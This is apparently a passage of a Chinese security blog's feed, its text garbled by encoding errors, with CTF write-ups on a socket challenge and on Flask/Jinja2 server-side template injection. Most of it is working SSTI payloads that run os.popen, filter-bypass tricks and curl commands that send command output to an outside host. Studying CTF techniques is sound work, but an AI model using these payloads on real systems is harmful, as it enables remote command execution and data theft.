class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">tcpCliSock.send(data)</span><br><span class="line">data = tcpCliSock.recv(BUFSIZ)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">tcpCliSock.close()</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æœ‰ä¸ªé—®é¢˜ï¼Œé¢˜ç›®çš„æœåŠ¡å™¨æ¯ä¸¤åˆ†é’Ÿé‡å¯ä¸€æ¬¡ï¼Œæ‹¿åˆ°shellåå†è£…vimä»€ä¹ˆçš„å¤ªæ…¢äº†ï¼Œäºæ˜¯å°†è„šæœ¬base64ç¼–ç ï¼Œ</p><p>echo base64_encoded_script | base64 -d &gt;1.py</p><p>ä»¥è¿™ç§æ–¹å¼å°†è„šæœ¬å†…å®¹ä¸Šä¼ è‡³webserverï¼Œpython3 1.pyæ‰§è¡Œå³å¯ã€‚</p><img src="http://cdn.polowong.top/static/images/xingctf.png"><p>æˆ‘è®¤ä¸ºclient.py å’Œclientçš„å®¹å™¨æ˜¯èµ·è¿·æƒ‘ä½œç”¨ æˆ–è€…è¯´æ˜¯æ¨¡æ‹Ÿåˆ«äººåœ¨å‘serverå‘é€è¯·æ±‚ï¼Œæ‰€ä»¥åœ¨æœ¬åœ°æ¨¡æ‹Ÿæ—¶æŠŠclientå®¹å™¨downæ‰å°±å¯ä»¥äº†ã€‚</p><p>ä¸ºäº†éªŒè¯è¿™é‡Œä¸€ç†è®ºï¼Œæˆ‘åœ¨é¢˜ç›®çš„åœ¨çº¿ç¯å¢ƒä¸­é€šè¿‡webserveræ‰“åˆ°clientæœåŠ¡å™¨è¿›è¡Œäº†LFIï¼Œå‘ç°å¹¶æ²¡æœ‰client.pyï¼Œæˆ‘è®¤ä¸ºä¸Šè¿°è¯´æ³•æˆç«‹ã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>å½“å‰è¿˜æœ‰ä¸ªé—®é¢˜å°±æ˜¯ä¸çŸ¥é“æ˜¯å“ªå¥è¯å®ç°äº†åˆ é™¤æ–‡ä»¶å‰æ‰§è¡Œäº†æ–‡ä»¶é‡Œçš„å†…å®¹ã€‚</p><p>å‚è€ƒé“¾æ¥ï¼š</p><p>é›ªå®wp</p><p><a href="https://blog.csdn.net/weixin_30526593/article/details/98650248">https://blog.csdn.net/weixin_30526593/article/details/98650248</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ä¸Šå‘¨æœ«åˆšç»“æŸäº†*ctfçš„æ¯”èµ›ï¼Œåˆæ‘¸é±¼äº†ã€‚ã€‚èµ›åçœ‹é›ªå®çš„wpå¤ç°å‡ºæ¥çš„ï¼Œå‘ç°æ˜¯socketå†™çš„æœ‰ç‚¹é—®é¢˜ æåˆ°å¤œé‡Œä¸‰ç‚¹ä¹Ÿæ²¡æå‡ºæ¥ wtcl&lt;/p&gt;
&lt;h1 id=&quot;oh-my-socket&quot;&gt;&lt;a href=&quot;#oh-my-socket&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>è¿‘æœŸsstié¢˜ç›®æ€»ç»“</title>
    <link href="https://polosec.github.io/2020/12/22/%E8%BF%91%E6%9C%9Fssti/"/>
    <id>https://polosec.github.io/2020/12/22/%E8%BF%91%E6%9C%9Fssti/</id>
    <published>2020-12-22T07:35:19.000Z</published>
    <updated>2021-01-06T13:34:04.259Z</updated>
    
    <content type="html"><![CDATA[<p>åˆ†æä¸‹è¿‘æœŸåšè¿‡çš„sstié¢˜ç›®çš„æ€è·¯</p><h1 id="ä½ çš„åå­—-é¢˜ç›®åˆ†æ"><a href="#ä½ çš„åå­—-é¢˜ç›®åˆ†æ" class="headerlink" title="ä½ çš„åå­— é¢˜ç›®åˆ†æ"></a>ä½ çš„åå­— é¢˜ç›®åˆ†æ</h1><p>æ‰“å¼€é¢˜ç›® å‘ç°è¾“å…¥åå­—</p><p>å°è¯•è¾“å…¥4</p><p>æŠ¥äº†ä¸€ä¸ªphpçš„é”™è¯¯</p><p>ç»§ç»­å°è¯•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% print 2*5 %&#125;</span><br></pre></td></tr></table></figure><p>æˆåŠŸ.</p><p>ä¸‹é¢å°†å°è¯•åˆ©ç”¨sstiè¿›è¡Œæ–‡ä»¶è¯»å–/å‘½ä»¤æ‰§è¡Œ</p><p>å°è¯•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print config%&#125;</span><br></pre></td></tr></table></figure><p>å¤±è´¥ï¼Œè¿”å›å€¼ä¸ºç©º</p><p>å°è¯•å¤šä¸ªå…³é”®å­—åï¼Œå‘ç°æ˜¯å¯¹é»‘åå•å…³é”®è¯é‡‡å–äº†ç½®ç©ºçš„æ–¹æ³•è¿›è¡Œè¿‡æ»¤ï¼Œé‚£ä¹ˆå¯ä»¥è€ƒè™‘åœ¨å…³é”®å­—ä¸­åŠ å…¥å¦ä¸€ä¸ªå…³é”®å­—çš„æ–¹å¼ï¼Œå¦‚ iconfigf ä»£è¡¨ifã€‚</p><p>é¦–å…ˆè·å¾—æ‰€æœ‰å­ç±»</p><p>payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">print</span> <span class="string">&#x27;&#x27;</span>.__claconfigss__.__mrconfigo__[<span class="number">2</span>].__subclconfigasses__()%&#125;</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°æ‰€æœ‰å­ç±»åï¼ŒæŸ¥æ‰¾init globalå­˜åœ¨osæ¨¡å—çš„ç±»ï¼Œå¸¸è§çš„æ˜¯catch_warningsç±»</p><p>æˆ‘è¿™é‡Œç”¨çš„æ˜¯ç¬¨æ–¹æ³•ï¼Œå°†æ‰€æœ‰çš„å­ç±»æ‰“å°å‡ºæ¥åæ”¾åˆ°sublimeé‡Œé¢æ‰¾åˆ°çš„catch_waringsç±»çš„ä¸‹æ ‡ä¸º59</p><p>ä¸‹é¢å°†è¿›ä¸€æ­¥åˆ©ç”¨è¯¥ç±»å®ç°å‘½ä»¤æ‰§è¡Œã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% print &#39;&#39;.__claconfigss__.__mrconfigo__[2].__subclconfigasses__()[59].__init__.__gloconfigbals__.linecaconfigche%&#125;</span><br><span class="line"></span><br><span class="line">&#123;% print &#39;&#39;.__claconfigss__.__mrconfigo__[2].__subclconfigasses__()[59].__init__.__gloconfigbals__.linecaconfigche.oconfigs.popconfigen(&#39;curl 172.16.157.75:7777 -d  &#96;ls &#x2F; |base64&#96;  &#39;)%&#125;</span><br><span class="line"></span><br><span class="line">é€šè¿‡curlå¤–å¸¦å‘½ä»¤æ‰§è¡Œçš„ç»“æœ,è·å¾—äº†å¤–å¸¦çš„æ ¹ç›®å½•lsçš„ç»“æœï¼Œå‘ç°äº†flagçš„å­˜æ”¾ä½ç½®ï¼Œç›´æ¥getflagã€‚</span><br><span class="line"></span><br><span class="line">&#123;% print &#39;&#39;.__claconfigss__.__mrconfigo__[2].__subclconfigasses__()[59].__init__.__gloconfigbals__.linecaconfigche.oconfigs.popconfigen(&#39;curl 172.16.157.75:7777 -d  &#96;tail &#x2F;flag_1s_Hera|base64&#96;&#39;)%&#125;</span><br></pre></td></tr></table></figure><h2 id="é¢˜å¤–è¯"><a href="#é¢˜å¤–è¯" class="headerlink" title="é¢˜å¤–è¯"></a>é¢˜å¤–è¯</h2><p>ä»‹ç»popençš„ç”¨æ³•</p><p>popenæ–¹æ³•åœ¨osæ¨¡å—ä¸‹ï¼Œä½¿ç”¨å‰éœ€è¦import os</p><p>popenæ˜¯ä»ä¸€ä¸ªå‘½ä»¤æ‰“å¼€ä¸€ä¸ªç®¡é“ï¼Œè¿”å›å€¼æ„å‘³ç€æ‰§è¡Œç»“æœï¼Œæ­£å¸¸æ‰§è¡Œçš„è¯è¿”å›å€¼ä¸º0</p><p>popenåœ¨sstiä¸­å¸¸ä½œä¸ºæ›¿ä»£systemè¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„ä¸€ç§æ–¹å¼ï¼Œç°æ¼”ç¤ºpopenç”¨æ³•</p><img src="http://cdn.polowong.top/static/images/ssti4.png"><p>åœ¨æ­¤ä¾‹ä¸­å¯ä»¥çœ‹åˆ°ï¼Œè°ƒç”¨os.popen.read()æ–¹æ³•ä¼šè¿”å›æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„ç»“æœï¼Œè€Œä¸æ˜¯æ‰§è¡ŒæˆåŠŸçš„è¿”å›å€¼0</p><p>popenæ–¹æ³•ä¸­subprocessæ¨¡å—ä¸‹ä¹Ÿæœ‰ã€‚</p><h1 id="å®‰æ´µæ¯-normal-ssti"><a href="#å®‰æ´µæ¯-normal-ssti" class="headerlink" title="å®‰æ´µæ¯ normal_ssti"></a>å®‰æ´µæ¯ normal_ssti</h1><p>é¦–å…ˆçœ‹è¿‡æ»¤äº†å“ªäº›å…³é”®å­—</p><img src="http://cdn.polowong.top/static/images/ssti1.png"><p>ä½¿ç”¨burp fuzzå…³é”®å­—ï¼Œå‘ç°è¿‡æ»¤äº†å¾ˆå¤šçš„å…³é”®å­—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é¦–å…ˆçœ‹è¿‡æ»¤äº†&#123;&#123;,å¯ä»¥ä½¿ç”¨&#123;%print%&#125;</span><br></pre></td></tr></table></figure><p>çš„æ–¹å¼æ‰§è¡Œè¡¨è¾¾å¼</p><p>è¿‡æ»¤äº†ç©ºæ ¼ï¼Œå¯ä»¥ç”¨å°æ‹¬å·çš„æ–¹å¼ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(1)%&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿˜è¿‡æ»¤äº†.  å¯ä»¥ç”¨a t t r()ç»•è¿‡</p><p>å…¶ä»–çš„å…³é”®å­—å¯ä»¥è€ƒè™‘ä½¿ç”¨unicodeç¼–ç ç»•è¿‡</p><p>lipsumæ–¹æ³•globlas-builtinsä¸­å­˜åœ¨osæ¨¡å—ï¼Œå¯ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤ã€‚</p><p>é¦–å…ˆæ„é€ æœªç¼–ç payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;whoami&quot;)|attr(&quot;read&quot;)())%&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæ„é€ ç¼–ç payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:5050&#x2F;test?url&#x3D;&#123;%print(lipsum|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(&quot;\u006f\u0073&quot;)|attr(&quot;\u0070\u006f\u0070\u0065\u006e&quot;)(&quot;\u0077\u0068\u006f\u0061\u006d\u0069&quot;)|attr(&quot;\u0072\u0065\u0061\u0064&quot;)())%&#125;</span><br><span class="line"></span><br><span class="line">æ¥ä¸‹æ¥å°è¯•è¯»å–flagï¼š</span><br><span class="line"></span><br><span class="line">&#123;%print(lipsum|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;os&quot;)|attr(&quot;popen&quot;)(&quot;cat&lt;&gt;&#x2F;flag&quot;)|attr(&quot;read&quot;)())%&#125;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;localhost:5050&#x2F;test?url&#x3D;&#123;%print(lipsum|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&quot;)(&quot;\u006f\u0073&quot;)|attr(&quot;\u0070\u006f\u0070\u0065\u006e&quot;)(&quot;\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067&quot;)|attr(&quot;\u0072\u0065\u0061\u0064&quot;)())%&#125;</span><br></pre></td></tr></table></figure><img src="http://cdn.polowong.top/static/images/ssti2.png"><h2 id="å¦ä¸€ç§æ€è·¯"><a href="#å¦ä¸€ç§æ€è·¯" class="headerlink" title="å¦ä¸€ç§æ€è·¯"></a>å¦ä¸€ç§æ€è·¯</h2><p>çœ‹äº†å¸ˆå‚…ä»¬çš„è§£æ³•ï¼Œæˆ‘åœ¨å°è¯•å¦ä¸€ç§ç¼–ç ç»•è¿‡çš„æ–¹å¼è§£å†³è¿™ä¸ªé—®é¢˜</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload1:http:&#x2F;&#x2F;127.0.0.1:5050&#x2F;test?url&#x3D;&#123;%print(1|attr(%22\137\137class\137\137%22)|attr(%22\137\137mro\137\137%22)|attr(%22\137\137\147etitem\137\137%22)(1)|attr(%22\137\137subclasses\137\137%22)()|attr(%22\137\137\147etitem\137\137%22)(186)|attr(%22\137\137init\137\137%22)|attr(%22\137\137\147lobals\137\137%22)|attr(&quot;\137\137\147etitem\137\137&quot;)(&quot;sys&quot;)|attr(&quot;modules&quot;)|attr(&quot;\137\137\147etitem\137\137&quot;)(&quot;os&quot;)|attr(%22popen%22)(%22whoami%22)|attr(%22read%22)())%&#125;</span><br><span class="line"></span><br><span class="line">payload2:</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1:5050&#x2F;test?url&#x3D;&#123;%print(a|attr(%22\137\137init\137\137%22)|attr(%22\137\137\147lobals\137\137%22)|attr(%22\137\137\147etitem\137\137%22)(%22sys%22)|attr(%22modules%22)|attr(%22\137\137\147etitem\137\137%22)(%22os%22)|attr(%22popen%22)(%22whoami%22)|attr(%22read%22)())%&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä¸¤ç§æ–¹æ³•æ˜¯é€šè¿‡æ‰¾sysæ¨¡å—ä¸­çš„osè¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚ï¼ˆè†œä¸€ä¸‹å¸ˆå‚…ï¼šï¼‰</p><h1 id="nctf-2020-ssti"><a href="#nctf-2020-ssti" class="headerlink" title="nctf 2020 ssti"></a>nctf 2020 ssti</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blacklist = [<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;class&#x27;</span>,<span class="string">&#x27;base&#x27;</span>,<span class="string">&#x27;mro&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;init&#x27;</span>,<span class="string">&#x27;global&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;req&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;attr&#x27;</span>,<span class="string">&#x27;get&#x27;</span>]</span><br></pre></td></tr></table></figure><p>æ‡’äº†ï¼Œæ”¹ä¸€ä¸‹ä¸Šé¢˜çš„blacklistç»§ç»­è·‘ï¼ˆdoge</p><p>å…ˆç”¨bp fuzzä¸€ä¸‹ï¼Œå‘ç°è¿‡æ»¤äº†å¾ˆå¤šå…³é”®å­—ã€‚</p><img src="http://cdn.polowong.top/static/images/ssti3.png"><p>æ ¹æ®ä¸Šé¢˜æ€è·¯ï¼Œå°è¯•unicodeç»•è¿‡å¯¹å…³é”®å­—çš„è¿‡æ»¤ï¼Œå¦‚</p><p>class -&gt;  \u0063\u006c\u0061\u0073\u0073</p><p>è¿™ç§æ–¹æ³•å¯ä»¥æˆåŠŸbypassã€‚</p><p>å®˜æ–¹wpçš„æ–¹æ³•æ˜¯ç”¨åå…­è¿›åˆ¶ç»•è¿‡ï¼Œä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œä¸‹é¢æ˜¯ç”¨16è¿›åˆ¶ç»•è¿‡çš„pldï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.90.89.27:5050/test?url=&#123;&#123;%22%22[%22\x5f\x5fcla%22+%22ss\x5f\x5f%22][%22\x5f\x5fmr%22+%22o\x5f\x5f%22][1][%22\x5f\x5fsubcla%22+%22sses\x5f\x5f%22]()[186][%22\x5f\x5fin%22+%22it\x5f\x5f%22][%22\x5f\x5fgloba%22+%22ls\x5f\x5f%22][%22sys%22][%22modules%22][%22os%22][%22popen%22](%22cat%3C%3E/flag%22)[%22read%22]()&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="unctf2020-ssti"><a href="#unctf2020-ssti" class="headerlink" title="unctf2020 ssti"></a>unctf2020 ssti</h1><p>blacklist:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ ] <span class="string">&#x27; &quot; _</span></span><br></pre></td></tr></table></figure><p>ç»•è¿‡æ–¹æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[] : __getitem__</span><br><span class="line"><span class="string">&#x27;å’Œ&quot;: request.args.xxx</span></span><br><span class="line"><span class="string">_: |attr()</span></span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload:http://192.168.0.116:5000/?url=&#123;&#123;()|attr(request.args.class)|attr(request.args.mro)|attr(request.args.getitem)(1)|attr(request.args.subclass)()|attr(request.args.getitem)(186)|attr(request.args.init)|attr(request.args.globals)|attr(request.args.getitem)(request.args.sys)|attr(request.args.mod)|attr(request.args.getitem)(request.args.os)|attr(request.args.popen)(request.args.whoami)|attr(request.args.read)()&#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;getitem=__getitem__&amp;&amp;subclass=__subclasses__&amp;init=__init__&amp;globals=__globals__&amp;sys=sys&amp;mod=modules&amp;os=os&amp;popen=popen&amp;whoami=whoami&amp;read=read</span><br></pre></td></tr></table></figure><h1 id="nctf-2020-ä½ å°±æ˜¯æˆ‘çš„masterå—"><a href="#nctf-2020-ä½ å°±æ˜¯æˆ‘çš„masterå—" class="headerlink" title="nctf 2020 ä½ å°±æ˜¯æˆ‘çš„masterå—"></a>nctf 2020 ä½ å°±æ˜¯æˆ‘çš„masterå—</h1><p>blacklistï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; . _ class base subclasses request</span></span><br></pre></td></tr></table></figure><p>ç»•è¿‡æ–¹æ³•:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; :  &quot;&quot;</span></span><br><span class="line"><span class="string">. :[&quot;xxx&quot;] </span></span><br><span class="line"><span class="string">_:å…«è¿›åˆ¶ åå…­è¿›åˆ¶ Unicode ç»•è¿‡ å…«è¿›åˆ¶å¦‚\137</span></span><br><span class="line"><span class="string">å…³é”®å­—ï¼š å­—ç¬¦ä¸²æ‹¼æ¥ å¦‚ &quot;cla&quot;+&quot;ss&quot;</span></span><br></pre></td></tr></table></figure><p>Payload:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.103:5000/?</span><br><span class="line">url=&#123;&#123;0[&quot;\137\137cla&quot;+&quot;ss\137\137&quot;][&quot;\137\137mro\137\137&quot;][1][&quot;\137\137subclas&quot;+&quot;ses\137\137&quot;]()[186][&quot;\137\137init\137\137&quot;][&quot;\137\137globals\137\137&quot;][&quot;sys&quot;][&quot;modules&quot;][&quot;os&quot;][&quot;popen&quot;](&quot;ls&quot;)[&quot;read&quot;]()&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>flask/jinja2æ¸²æŸ“æ®·å‹¤çš„sstié—®é¢˜è€ƒå¯Ÿæ›´å¤šçš„æ˜¯å¯¹builtinså‡½æ•°/æ¨¡å—çš„ä½¿ç”¨ä»¥åŠäº†è§£ç¨‹åº¦ï¼Œå„ç§ç»•è¿‡è¿‡æ»¤æŠ€å·§ æ¢è€Œè¨€ä¹‹æ˜¯å¯¹pythonè¯­è¨€åŸºç¡€è¯­æ³•çš„ç†è§£ç¨‹åº¦å’Œé¢å‘å¯¹è±¡æ€æƒ³çš„ç†Ÿç»ƒç¨‹åº¦ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;åˆ†æä¸‹è¿‘æœŸåšè¿‡çš„sstié¢˜ç›®çš„æ€è·¯&lt;/p&gt;
&lt;h1 id=&quot;ä½ çš„åå­—-é¢˜ç›®åˆ†æ&quot;&gt;&lt;a href=&quot;#ä½ çš„åå­—-é¢˜ç›®åˆ†æ&quot; class=&quot;headerlink&quot; title=&quot;ä½ çš„åå­— é¢˜ç›®åˆ†æ&quot;&gt;&lt;/a&gt;ä½ çš„åå­— é¢˜ç›®åˆ†æ&lt;/h1&gt;&lt;p&gt;æ‰“å¼€é¢˜ç›® å‘ç°è¾“å…¥åå­—&lt;/p&gt;
&lt;</summary>
      
    
    
    
    
  </entry>
  
</feed>
